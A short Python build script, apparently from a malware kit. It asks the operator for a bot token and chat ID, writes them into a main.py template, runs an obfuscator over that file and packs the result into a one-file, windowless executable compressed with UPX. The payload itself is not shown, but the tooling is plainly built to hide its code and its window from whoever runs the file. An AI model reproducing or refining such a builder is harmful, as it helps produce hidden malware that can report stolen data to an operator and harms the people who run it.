import os
import shutil
import subprocess

class Builder:
    def __init__(self) -> None:
        self.PyInstallerCommand = "pyinstaller --onefile --noconsole --clean --noconfirm --upx-dir ../UPX --icon=NONE"
    
    def replace_data(self, token, chat_id, file_path="main.py"):
        with open(file_path, "r", encoding="utf-8") as file:
            content = file.read()
        
        content = content.replace("%TOKEN%", token)
        content = content.replace("%CHAT_ID%", chat_id)
        
        with open(file_path, "w", encoding="utf-8") as file:
            file.write(content)
        
        print("[INFO] %TOKEN% and %CHAT_ID% replaced successfully.")

    def obfuscate_main(self):
        print("[INFO] Starting obfuscation...")
        subprocess.run(["python", "obfuscator.py", "main.py"], check=True)
        print("[INFO] Obfuscation completed.")
    

    def convert_to_exe(self):
        print("[INFO] Converting to .exe...")
        if not os.path.exists("build"):
            print("[ERROR] 'build' folder does not exist. Make sure obfuscation was completed.")
            return
        
        os.chdir("build")
        py_files = [f for f in os.listdir() if f.endswith(".py")]
        if not py_files:
            print("[ERROR] No .py files found in 'build' folder.")
            return
        
        self.PyInstallerCommand += f" {py_files[0]}"
        subprocess.run(self.PyInstallerCommand, shell=True, check=True)
        print("[INFO] Conversion to .exe completed.")
        os.chdir("..")

    def main(self):
        token = input("TOKEN: ")
        chat_id = input("CHAT ID: ")
        self.replace_data(token, chat_id)
        self.obfuscate_main()
        self.convert_to_exe()

if __name__ == "__main__":
    builder = Builder()
    builder.main()


